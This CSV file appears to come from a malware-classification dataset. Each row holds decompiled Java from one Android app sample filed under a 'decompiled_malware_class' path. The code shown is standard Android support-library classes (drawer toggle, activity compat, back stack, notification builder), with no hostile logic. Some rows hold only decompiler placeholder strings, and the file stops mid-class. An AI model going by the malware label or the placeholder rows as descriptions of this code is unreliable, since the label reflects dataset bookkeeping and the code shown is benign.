"filepath","code"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.accessibilityservice\AccessibilityServiceInfoCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1a6c1270"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.accessibilityservice\AccessibilityServiceInfoCompatIcs.code","class AccessibilityServiceInfoCompatIcs {   AccessibilityServiceInfoCompatIcs(){   }   public static boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return info.getCanRetrieveWindowContent();   }   public static String getDescription(  AccessibilityServiceInfo info){     return info.getDescription();   }   public static String getId(  AccessibilityServiceInfo info){     return info.getId();   }   public static ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return info.getResolveInfo();   }   public static String getSettingsActivityName(  AccessibilityServiceInfo info){     return info.getSettingsActivityName();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.accessibilityservice\AccessibilityServiceInfoCompatJellyBeanMr2.code","class AccessibilityServiceInfoCompatJellyBeanMr2 {   AccessibilityServiceInfoCompatJellyBeanMr2(){   }   public static int getCapabilities(  AccessibilityServiceInfo info){     return info.getCapabilities();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.accessibilityservice\AccessibilityServiceInfoIcsImpl.code","static class AccessibilityServiceInfoIcsImpl extends AccessibilityServiceInfoStubImpl {   AccessibilityServiceInfoIcsImpl(){   }   @Override public boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getCanRetrieveWindowContent(info);   }   @Override public String getDescription(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getDescription(info);   }   @Override public String getId(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getId(info);   }   @Override public ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getResolveInfo(info);   }   @Override public String getSettingsActivityName(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getSettingsActivityName(info);   }   @Override public int getCapabilities(  AccessibilityServiceInfo info){     return getCanRetrieveWindowContent(info) ? 1 : 0;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.accessibilityservice\AccessibilityServiceInfoJellyBeanMr2.code","static class AccessibilityServiceInfoJellyBeanMr2 extends AccessibilityServiceInfoIcsImpl {   AccessibilityServiceInfoJellyBeanMr2(){   }   @Override public int getCapabilities(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatJellyBeanMr2.getCapabilities(info);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.accessibilityservice\AccessibilityServiceInfoStubImpl.code","static class AccessibilityServiceInfoStubImpl implements AccessibilityServiceInfoVersionImpl {   AccessibilityServiceInfoStubImpl(){   }   @Override public boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return false;   }   @Override public String getDescription(  AccessibilityServiceInfo info){     return null;   }   @Override public String getId(  AccessibilityServiceInfo info){     return null;   }   @Override public ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return null;   }   @Override public String getSettingsActivityName(  AccessibilityServiceInfo info){     return null;   }   @Override public int getCapabilities(  AccessibilityServiceInfo info){     return 0;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.accessibilityservice\AccessibilityServiceInfoVersionImpl.code","interface AccessibilityServiceInfoVersionImpl {   boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo accessibilityServiceInfo);   int getCapabilities(  AccessibilityServiceInfo accessibilityServiceInfo);   String getDescription(  AccessibilityServiceInfo accessibilityServiceInfo);   String getId(  AccessibilityServiceInfo accessibilityServiceInfo);   ResolveInfo getResolveInfo(  AccessibilityServiceInfo accessibilityServiceInfo);   String getSettingsActivityName(  AccessibilityServiceInfo accessibilityServiceInfo); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\Action.code","public static class Action {   public PendingIntent actionIntent;   public int icon;   public CharSequence title;   public Action(  int icon_,  CharSequence title_,  PendingIntent intent_){     this.icon=icon_;     this.title=title_;     this.actionIntent=intent_;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ActionBarDrawerToggle.code","public class ActionBarDrawerToggle implements DrawerLayout.DrawerListener {   private static final int ID_HOME=16908332;   private static final ActionBarDrawerToggleImpl IMPL;   private static final float TOGGLE_DRAWABLE_OFFSET=0.33333334f;   private final Activity mActivity;   private final Delegate mActivityImpl;   private final int mCloseDrawerContentDescRes;   private Drawable mDrawerImage;   private final int mDrawerImageResource;   private boolean mDrawerIndicatorEnabled=true;   private final DrawerLayout mDrawerLayout;   private final int mOpenDrawerContentDescRes;   private Object mSetIndicatorInfo;   private SlideDrawable mSlider;   private Drawable mThemeImage; public interface ActionBarDrawerToggleImpl {     Drawable getThemeUpIndicator(    Activity activity);     Object setActionBarDescription(    Object obj,    Activity activity,    int i);     Object setActionBarUpIndicator(    Object obj,    Activity activity,    Drawable drawable,    int i);   } public interface Delegate {     Drawable getThemeUpIndicator();     void setActionBarDescription(    int i);     void setActionBarUpIndicator(    Drawable drawable,    int i);   } public interface DelegateProvider {     Delegate getDrawerToggleDelegate();   } private static class ActionBarDrawerToggleImplBase implements ActionBarDrawerToggleImpl {     private ActionBarDrawerToggleImplBase(){     }     @Override public Drawable getThemeUpIndicator(    Activity activity){       return null;     }     @Override public Object setActionBarUpIndicator(    Object info,    Activity activity,    Drawable themeImage,    int contentDescRes){       return info;     }     @Override public Object setActionBarDescription(    Object info,    Activity activity,    int contentDescRes){       return info;     }   } private static class ActionBarDrawerToggleImplHC implements ActionBarDrawerToggleImpl {     private ActionBarDrawerToggleImplHC(){     }     @Override public Drawable getThemeUpIndicator(    Activity activity){       return ActionBarDrawerToggleHoneycomb.getThemeUpIndicator(activity);     }     @Override public Object setActionBarUpIndicator(    Object info,    Activity activity,    Drawable themeImage,    int contentDescRes){       return ActionBarDrawerToggleHoneycomb.setActionBarUpIndicator(info,activity,themeImage,contentDescRes);     }     @Override public Object setActionBarDescription(    Object info,    Activity activity,    int contentDescRes){       return ActionBarDrawerToggleHoneycomb.setActionBarDescription(info,activity,contentDescRes);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 11) {       IMPL=new ActionBarDrawerToggleImplHC();     }  else {       IMPL=new ActionBarDrawerToggleImplBase();     }   }   public ActionBarDrawerToggle(  Activity activity,  DrawerLayout drawerLayout,  int drawerImageRes,  int openDrawerContentDescRes,  int closeDrawerContentDescRes){     this.mActivity=activity;     if (activity instanceof DelegateProvider) {       this.mActivityImpl=((DelegateProvider)activity).getDrawerToggleDelegate();     }  else {       this.mActivityImpl=null;     }     this.mDrawerLayout=drawerLayout;     this.mDrawerImageResource=drawerImageRes;     this.mOpenDrawerContentDescRes=openDrawerContentDescRes;     this.mCloseDrawerContentDescRes=closeDrawerContentDescRes;     this.mThemeImage=getThemeUpIndicator();     this.mDrawerImage=activity.getResources().getDrawable(drawerImageRes);     this.mSlider=new SlideDrawable(this.mDrawerImage);     this.mSlider.setOffset(TOGGLE_DRAWABLE_OFFSET);   }   public void syncState(){     if (this.mDrawerLayout.isDrawerOpen(GravityCompat.START)) {       this.mSlider.setPosition(1.0f);     }  else {       this.mSlider.setPosition(0.0f);     }     if (this.mDrawerIndicatorEnabled) {       setActionBarUpIndicator(this.mSlider,this.mDrawerLayout.isDrawerOpen(GravityCompat.START) ? this.mCloseDrawerContentDescRes : this.mOpenDrawerContentDescRes);     }   }   public void setDrawerIndicatorEnabled(  boolean enable){     if (enable != this.mDrawerIndicatorEnabled) {       if (enable) {         setActionBarUpIndicator(this.mSlider,this.mDrawerLayout.isDrawerOpen(GravityCompat.START) ? this.mCloseDrawerContentDescRes : this.mOpenDrawerContentDescRes);       }  else {         setActionBarUpIndicator(this.mThemeImage,0);       }       this.mDrawerIndicatorEnabled=enable;     }   }   public boolean isDrawerIndicatorEnabled(){     return this.mDrawerIndicatorEnabled;   }   public void onConfigurationChanged(  Configuration newConfig){     this.mThemeImage=getThemeUpIndicator();     this.mDrawerImage=this.mActivity.getResources().getDrawable(this.mDrawerImageResource);     syncState();   }   public boolean onOptionsItemSelected(  MenuItem item){     if (item != null && item.getItemId() == 16908332 && this.mDrawerIndicatorEnabled) {       if (this.mDrawerLayout.isDrawerVisible(GravityCompat.START)) {         this.mDrawerLayout.closeDrawer(GravityCompat.START);       }  else {         this.mDrawerLayout.openDrawer(GravityCompat.START);       }       return true;     }     return false;   }   @Override public void onDrawerSlide(  View drawerView,  float slideOffset){     float glyphOffset;     float glyphOffset2=this.mSlider.getPosition();     if (slideOffset > 0.5f) {       glyphOffset=Math.max(glyphOffset2,Math.max(0.0f,slideOffset - 0.5f) * 2.0f);     }  else {       glyphOffset=Math.min(glyphOffset2,slideOffset * 2.0f);     }     this.mSlider.setPosition(glyphOffset);   }   @Override public void onDrawerOpened(  View drawerView){     this.mSlider.setPosition(1.0f);     if (this.mDrawerIndicatorEnabled) {       setActionBarDescription(this.mCloseDrawerContentDescRes);     }   }   @Override public void onDrawerClosed(  View drawerView){     this.mSlider.setPosition(0.0f);     if (this.mDrawerIndicatorEnabled) {       setActionBarDescription(this.mOpenDrawerContentDescRes);     }   }   @Override public void onDrawerStateChanged(  int newState){   }   Drawable getThemeUpIndicator(){     return this.mActivityImpl != null ? this.mActivityImpl.getThemeUpIndicator() : IMPL.getThemeUpIndicator(this.mActivity);   }   void setActionBarUpIndicator(  Drawable upDrawable,  int contentDescRes){     if (this.mActivityImpl != null) {       this.mActivityImpl.setActionBarUpIndicator(upDrawable,contentDescRes);     }  else {       this.mSetIndicatorInfo=IMPL.setActionBarUpIndicator(this.mSetIndicatorInfo,this.mActivity,upDrawable,contentDescRes);     }   }   void setActionBarDescription(  int contentDescRes){     if (this.mActivityImpl != null) {       this.mActivityImpl.setActionBarDescription(contentDescRes);     }  else {       this.mSetIndicatorInfo=IMPL.setActionBarDescription(this.mSetIndicatorInfo,this.mActivity,contentDescRes);     }   } public class SlideDrawable extends LevelListDrawable implements Drawable.Callback {     private final boolean mHasMirroring;     private float mOffset;     private float mPosition;     private final Rect mTmpRect;     private SlideDrawable(    Drawable wrapped){       this.mHasMirroring=Build.VERSION.SDK_INT > 18;       this.mTmpRect=new Rect();       if (DrawableCompat.isAutoMirrored(wrapped)) {         DrawableCompat.setAutoMirrored(this,true);       }       addLevel(0,0,wrapped);     }     public void setPosition(    float position){       this.mPosition=position;       invalidateSelf();     }     public float getPosition(){       return this.mPosition;     }     public void setOffset(    float offset){       this.mOffset=offset;       invalidateSelf();     }     @Override public void draw(    Canvas canvas){       copyBounds(this.mTmpRect);       canvas.save();       boolean isLayoutRTL=ViewCompat.getLayoutDirection(ActionBarDrawerToggle.this.mActivity.getWindow().getDecorView()) == 1;       int flipRtl=isLayoutRTL ? -1 : 1;       int width=this.mTmpRect.width();       canvas.translate((-this.mOffset) * width * this.mPosition* flipRtl,0.0f);       if (isLayoutRTL && !this.mHasMirroring) {         canvas.translate(width,0.0f);         canvas.scale(-1.0f,1.0f);       }       super.draw(canvas);       canvas.restore();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ActionBarDrawerToggleHoneycomb.code","class ActionBarDrawerToggleHoneycomb {   private static final String TAG=""ActionBarDrawerToggleHoneycomb"";   private static final int[] THEME_ATTRS={R.attr.homeAsUpIndicator};   ActionBarDrawerToggleHoneycomb(){   }   public static Object setActionBarUpIndicator(  Object info,  Activity activity,  Drawable drawable,  int contentDescRes){     if (info == null) {       info=new SetIndicatorInfo(activity);     }     SetIndicatorInfo sii=(SetIndicatorInfo)info;     if (sii.setHomeAsUpIndicator != null) {       try {         ActionBar actionBar=activity.getActionBar();         sii.setHomeAsUpIndicator.invoke(actionBar,drawable);         sii.setHomeActionContentDescription.invoke(actionBar,Integer.valueOf(contentDescRes));       }  catch (      Exception e) {         Log.w(TAG,""Couldn't set home-as-up indicator via JB-MR2 API"",e);       }     }  else     if (sii.upIndicatorView != null) {       sii.upIndicatorView.setImageDrawable(drawable);     }  else {       Log.w(TAG,""Couldn't set home-as-up indicator"");     }     return info;   }   public static Object setActionBarDescription(  Object info,  Activity activity,  int contentDescRes){     if (info == null) {       info=new SetIndicatorInfo(activity);     }     SetIndicatorInfo sii=(SetIndicatorInfo)info;     if (sii.setHomeAsUpIndicator != null) {       try {         ActionBar actionBar=activity.getActionBar();         sii.setHomeActionContentDescription.invoke(actionBar,Integer.valueOf(contentDescRes));       }  catch (      Exception e) {         Log.w(TAG,""Couldn't set content description via JB-MR2 API"",e);       }     }     return info;   }   public static Drawable getThemeUpIndicator(  Activity activity){     TypedArray a2=activity.obtainStyledAttributes(THEME_ATTRS);     Drawable result=a2.getDrawable(0);     a2.recycle();     return result;   } private static class SetIndicatorInfo {     public Method setHomeActionContentDescription;     public Method setHomeAsUpIndicator;     public ImageView upIndicatorView;     SetIndicatorInfo(    Activity activity){       try {         this.setHomeAsUpIndicator=ActionBar.class.getDeclaredMethod(""setHomeAsUpIndicator"",Drawable.class);         this.setHomeActionContentDescription=ActionBar.class.getDeclaredMethod(""setHomeActionContentDescription"",Integer.TYPE);       }  catch (      NoSuchMethodException e) {         View home=activity.findViewById(R.id.home);         if (home != null) {           ViewGroup parent=(ViewGroup)home.getParent();           int childCount=parent.getChildCount();           if (childCount == 2) {             View first=parent.getChildAt(0);             View second=parent.getChildAt(1);             View up=first.getId() == 16908332 ? second : first;             if (up instanceof ImageView) {               this.upIndicatorView=(ImageView)up;             }           }         }       }     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ActionBarDrawerToggleImpl.code","public interface ActionBarDrawerToggleImpl {   Drawable getThemeUpIndicator(  Activity activity);   Object setActionBarDescription(  Object obj,  Activity activity,  int i);   Object setActionBarUpIndicator(  Object obj,  Activity activity,  Drawable drawable,  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ActionBarDrawerToggleImplBase.code","private static class ActionBarDrawerToggleImplBase implements ActionBarDrawerToggleImpl {   private ActionBarDrawerToggleImplBase(){   }   @Override public Drawable getThemeUpIndicator(  Activity activity){     return null;   }   @Override public Object setActionBarUpIndicator(  Object info,  Activity activity,  Drawable themeImage,  int contentDescRes){     return info;   }   @Override public Object setActionBarDescription(  Object info,  Activity activity,  int contentDescRes){     return info;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ActionBarDrawerToggleImplHC.code","private static class ActionBarDrawerToggleImplHC implements ActionBarDrawerToggleImpl {   private ActionBarDrawerToggleImplHC(){   }   @Override public Drawable getThemeUpIndicator(  Activity activity){     return ActionBarDrawerToggleHoneycomb.getThemeUpIndicator(activity);   }   @Override public Object setActionBarUpIndicator(  Object info,  Activity activity,  Drawable themeImage,  int contentDescRes){     return ActionBarDrawerToggleHoneycomb.setActionBarUpIndicator(info,activity,themeImage,contentDescRes);   }   @Override public Object setActionBarDescription(  Object info,  Activity activity,  int contentDescRes){     return ActionBarDrawerToggleHoneycomb.setActionBarDescription(info,activity,contentDescRes);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ActivityCompat.code","public class ActivityCompat extends ContextCompat {   public static boolean invalidateOptionsMenu(  Activity activity){     if (Build.VERSION.SDK_INT < 11) {       return false;     }     ActivityCompatHoneycomb.invalidateOptionsMenu(activity);     return true;   }   public static void startActivity(  Activity activity,  Intent intent,  Bundle options){     if (Build.VERSION.SDK_INT >= 16) {       ActivityCompatJB.startActivity(activity,intent,options);     }  else {       activity.startActivity(intent);     }   }   public static void startActivityForResult(  Activity activity,  Intent intent,  int requestCode,  Bundle options){     if (Build.VERSION.SDK_INT >= 16) {       ActivityCompatJB.startActivityForResult(activity,intent,requestCode,options);     }  else {       activity.startActivityForResult(intent,requestCode);     }   }   public static void finishAffinity(  Activity activity){     if (Build.VERSION.SDK_INT >= 16) {       ActivityCompatJB.finishAffinity(activity);     }  else {       activity.finish();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ActivityCompatHoneycomb.code","class ActivityCompatHoneycomb {   ActivityCompatHoneycomb(){   }   public static void invalidateOptionsMenu(  Activity activity){     activity.invalidateOptionsMenu();   }   static void dump(  Activity activity,  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     activity.dump(prefix,fd,writer,args);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ActivityCompatJB.code","class ActivityCompatJB {   ActivityCompatJB(){   }   public static void startActivity(  Context context,  Intent intent,  Bundle options){     context.startActivity(intent,options);   }   public static void startActivityForResult(  Activity activity,  Intent intent,  int requestCode,  Bundle options){     activity.startActivityForResult(intent,requestCode,options);   }   public static void finishAffinity(  Activity activity){     activity.finishAffinity();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ActivityOptionsCompat.code","public class ActivityOptionsCompat {   public static ActivityOptionsCompat makeCustomAnimation(  Context context,  int enterResId,  int exitResId){     return Build.VERSION.SDK_INT >= 16 ? new ActivityOptionsImplJB(ActivityOptionsCompatJB.makeCustomAnimation(context,enterResId,exitResId)) : new ActivityOptionsCompat();   }   public static ActivityOptionsCompat makeScaleUpAnimation(  View source,  int startX,  int startY,  int startWidth,  int startHeight){     return Build.VERSION.SDK_INT >= 16 ? new ActivityOptionsImplJB(ActivityOptionsCompatJB.makeScaleUpAnimation(source,startX,startY,startWidth,startHeight)) : new ActivityOptionsCompat();   }   public static ActivityOptionsCompat makeThumbnailScaleUpAnimation(  View source,  Bitmap thumbnail,  int startX,  int startY){     return Build.VERSION.SDK_INT >= 16 ? new ActivityOptionsImplJB(ActivityOptionsCompatJB.makeThumbnailScaleUpAnimation(source,thumbnail,startX,startY)) : new ActivityOptionsCompat();   } private static class ActivityOptionsImplJB extends ActivityOptionsCompat {     private final ActivityOptionsCompatJB mImpl;     ActivityOptionsImplJB(    ActivityOptionsCompatJB impl){       this.mImpl=impl;     }     @Override public Bundle toBundle(){       return this.mImpl.toBundle();     }     @Override public void update(    ActivityOptionsCompat otherOptions){       if (otherOptions instanceof ActivityOptionsImplJB) {         ActivityOptionsImplJB otherImpl=(ActivityOptionsImplJB)otherOptions;         this.mImpl.update(otherImpl.mImpl);       }     }   }   protected ActivityOptionsCompat(){   }   public Bundle toBundle(){     return null;   }   public void update(  ActivityOptionsCompat otherOptions){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ActivityOptionsCompatJB.code","class ActivityOptionsCompatJB {   private final ActivityOptions mActivityOptions;   public static ActivityOptionsCompatJB makeCustomAnimation(  Context context,  int enterResId,  int exitResId){     return new ActivityOptionsCompatJB(ActivityOptions.makeCustomAnimation(context,enterResId,exitResId));   }   public static ActivityOptionsCompatJB makeScaleUpAnimation(  View source,  int startX,  int startY,  int startWidth,  int startHeight){     return new ActivityOptionsCompatJB(ActivityOptions.makeScaleUpAnimation(source,startX,startY,startWidth,startHeight));   }   public static ActivityOptionsCompatJB makeThumbnailScaleUpAnimation(  View source,  Bitmap thumbnail,  int startX,  int startY){     return new ActivityOptionsCompatJB(ActivityOptions.makeThumbnailScaleUpAnimation(source,thumbnail,startX,startY));   }   private ActivityOptionsCompatJB(  ActivityOptions activityOptions){     this.mActivityOptions=activityOptions;   }   public Bundle toBundle(){     return this.mActivityOptions.toBundle();   }   public void update(  ActivityOptionsCompatJB otherOptions){     this.mActivityOptions.update(otherOptions.mActivityOptions);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ActivityOptionsImplJB.code","private static class ActivityOptionsImplJB extends ActivityOptionsCompat {   private final ActivityOptionsCompatJB mImpl;   ActivityOptionsImplJB(  ActivityOptionsCompatJB impl){     this.mImpl=impl;   }   @Override public Bundle toBundle(){     return this.mImpl.toBundle();   }   @Override public void update(  ActivityOptionsCompat otherOptions){     if (otherOptions instanceof ActivityOptionsImplJB) {       ActivityOptionsImplJB otherImpl=(ActivityOptionsImplJB)otherOptions;       this.mImpl.update(otherImpl.mImpl);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\BackStackEntry.code","public interface BackStackEntry {   CharSequence getBreadCrumbShortTitle();   int getBreadCrumbShortTitleRes();   CharSequence getBreadCrumbTitle();   int getBreadCrumbTitleRes();   int getId();   String getName(); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\BackStackRecord.code","!org.eclipse.jdt.core.dom.TypeDeclaration@a2b54e3"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\BackStackState.code","public final class BackStackState implements Parcelable {   public static final Parcelable.Creator<BackStackState> CREATOR=new Parcelable.Creator<BackStackState>(){     @Override public BackStackState createFromParcel(    Parcel in){       return new BackStackState(in);     }     @Override public BackStackState[] newArray(    int size){       return new BackStackState[size];     }   } ;   final int mBreadCrumbShortTitleRes;   final CharSequence mBreadCrumbShortTitleText;   final int mBreadCrumbTitleRes;   final CharSequence mBreadCrumbTitleText;   final int mIndex;   final String mName;   final int[] mOps;   final int mTransition;   final int mTransitionStyle;   public BackStackState(  FragmentManagerImpl fm,  BackStackRecord bse){     int pos;     int numRemoved=0;     for (BackStackRecord.Op op=bse.mHead; op != null; op=op.next) {       if (op.removed != null) {         numRemoved+=op.removed.size();       }     }     this.mOps=new int[(bse.mNumOp * 7) + numRemoved];     if (!bse.mAddToBackStack) {       throw new IllegalStateException(""Not on back stack"");     }     BackStackRecord.Op op2=bse.mHead;     int pos2=0;     while (op2 != null) {       int pos3=pos2 + 1;       this.mOps[pos2]=op2.cmd;       int pos4=pos3 + 1;       this.mOps[pos3]=op2.fragment != null ? op2.fragment.mIndex : -1;       int pos5=pos4 + 1;       this.mOps[pos4]=op2.enterAnim;       int pos6=pos5 + 1;       this.mOps[pos5]=op2.exitAnim;       int pos7=pos6 + 1;       this.mOps[pos6]=op2.popEnterAnim;       int pos8=pos7 + 1;       this.mOps[pos7]=op2.popExitAnim;       if (op2.removed != null) {         int N=op2.removed.size();         this.mOps[pos8]=N;         int i=0;         int pos9=pos8 + 1;         while (i < N) {           this.mOps[pos9]=op2.removed.get(i).mIndex;           i++;           pos9++;         }         pos=pos9;       }  else {         pos=pos8 + 1;         this.mOps[pos8]=0;       }       op2=op2.next;       pos2=pos;     }     this.mTransition=bse.mTransition;     this.mTransitionStyle=bse.mTransitionStyle;     this.mName=bse.mName;     this.mIndex=bse.mIndex;     this.mBreadCrumbTitleRes=bse.mBreadCrumbTitleRes;     this.mBreadCrumbTitleText=bse.mBreadCrumbTitleText;     this.mBreadCrumbShortTitleRes=bse.mBreadCrumbShortTitleRes;     this.mBreadCrumbShortTitleText=bse.mBreadCrumbShortTitleText;   }   public BackStackState(  Parcel in){     this.mOps=in.createIntArray();     this.mTransition=in.readInt();     this.mTransitionStyle=in.readInt();     this.mName=in.readString();     this.mIndex=in.readInt();     this.mBreadCrumbTitleRes=in.readInt();     this.mBreadCrumbTitleText=(CharSequence)TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(in);     this.mBreadCrumbShortTitleRes=in.readInt();     this.mBreadCrumbShortTitleText=(CharSequence)TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(in);   }   public BackStackRecord instantiate(  FragmentManagerImpl fm){     BackStackRecord bse=new BackStackRecord(fm);     int pos=0;     int num=0;     while (pos < this.mOps.length) {       BackStackRecord.Op op=new BackStackRecord.Op();       int pos2=pos + 1;       op.cmd=this.mOps[pos];       if (FragmentManagerImpl.DEBUG) {         Log.v(""FragmentManager"",""Instantiate "" + bse + "" op #""+ num+ "" base fragment #""+ this.mOps[pos2]);       }       int pos3=pos2 + 1;       int findex=this.mOps[pos2];       if (findex >= 0) {         Fragment f=fm.mActive.get(findex);         op.fragment=f;       }  else {         op.fragment=null;       }       int pos4=pos3 + 1;       op.enterAnim=this.mOps[pos3];       int pos5=pos4 + 1;       op.exitAnim=this.mOps[pos4];       int pos6=pos5 + 1;       op.popEnterAnim=this.mOps[pos5];       int pos7=pos6 + 1;       op.popExitAnim=this.mOps[pos6];       int pos8=pos7 + 1;       int N=this.mOps[pos7];       if (N > 0) {         op.removed=new ArrayList<>(N);         int i=0;         while (i < N) {           if (FragmentManagerImpl.DEBUG) {             Log.v(""FragmentManager"",""Instantiate "" + bse + "" set remove fragment #""+ this.mOps[pos8]);           }           Fragment r=fm.mActive.get(this.mOps[pos8]);           op.removed.add(r);           i++;           pos8++;         }       }       pos=pos8;       bse.addOp(op);       num++;     }     bse.mTransition=this.mTransition;     bse.mTransitionStyle=this.mTransitionStyle;     bse.mName=this.mName;     bse.mIndex=this.mIndex;     bse.mAddToBackStack=true;     bse.mBreadCrumbTitleRes=this.mBreadCrumbTitleRes;     bse.mBreadCrumbTitleText=this.mBreadCrumbTitleText;     bse.mBreadCrumbShortTitleRes=this.mBreadCrumbShortTitleRes;     bse.mBreadCrumbShortTitleText=this.mBreadCrumbShortTitleText;     bse.bumpBackStackNesting(1);     return bse;   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeIntArray(this.mOps);     dest.writeInt(this.mTransition);     dest.writeInt(this.mTransitionStyle);     dest.writeString(this.mName);     dest.writeInt(this.mIndex);     dest.writeInt(this.mBreadCrumbTitleRes);     TextUtils.writeToParcel(this.mBreadCrumbTitleText,dest,0);     dest.writeInt(this.mBreadCrumbShortTitleRes);     TextUtils.writeToParcel(this.mBreadCrumbShortTitleText,dest,0);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\BigPictureStyle.code","public static class BigPictureStyle extends Style {   Bitmap mBigLargeIcon;   boolean mBigLargeIconSet;   Bitmap mPicture;   public BigPictureStyle(){   }   public BigPictureStyle(  Builder builder){     setBuilder(builder);   }   public BigPictureStyle setBigContentTitle(  CharSequence title){     this.mBigContentTitle=title;     return this;   }   public BigPictureStyle setSummaryText(  CharSequence cs){     this.mSummaryText=cs;     this.mSummaryTextSet=true;     return this;   }   public BigPictureStyle bigPicture(  Bitmap b2){     this.mPicture=b2;     return this;   }   public BigPictureStyle bigLargeIcon(  Bitmap b2){     this.mBigLargeIcon=b2;     this.mBigLargeIconSet=true;     return this;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\BigTextStyle.code","public static class BigTextStyle extends Style {   CharSequence mBigText;   public BigTextStyle(){   }   public BigTextStyle(  Builder builder){     setBuilder(builder);   }   public BigTextStyle setBigContentTitle(  CharSequence title){     this.mBigContentTitle=title;     return this;   }   public BigTextStyle setSummaryText(  CharSequence cs){     this.mSummaryText=cs;     this.mSummaryTextSet=true;     return this;   }   public BigTextStyle bigText(  CharSequence cs){     this.mBigText=cs;     return this;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\Builder.code","public static class Builder {   CharSequence mContentInfo;   PendingIntent mContentIntent;   CharSequence mContentText;   CharSequence mContentTitle;   Context mContext;   PendingIntent mFullScreenIntent;   Bitmap mLargeIcon;   int mNumber;   int mPriority;   int mProgress;   boolean mProgressIndeterminate;   int mProgressMax;   Style mStyle;   CharSequence mSubText;   RemoteViews mTickerView;   boolean mUseChronometer;   ArrayList<Action> mActions=new ArrayList<>();   Notification mNotification=new Notification();   public Builder(  Context context){     this.mContext=context;     this.mNotification.when=System.currentTimeMillis();     this.mNotification.audioStreamType=-1;     this.mPriority=0;   }   public Builder setWhen(  long when){     this.mNotification.when=when;     return this;   }   public Builder setUsesChronometer(  boolean b2){     this.mUseChronometer=b2;     return this;   }   public Builder setSmallIcon(  int icon){     this.mNotification.icon=icon;     return this;   }   public Builder setSmallIcon(  int icon,  int level){     this.mNotification.icon=icon;     this.mNotification.iconLevel=level;     return this;   }   public Builder setContentTitle(  CharSequence title){     this.mContentTitle=title;     return this;   }   public Builder setContentText(  CharSequence text){     this.mContentText=text;     return this;   }   public Builder setSubText(  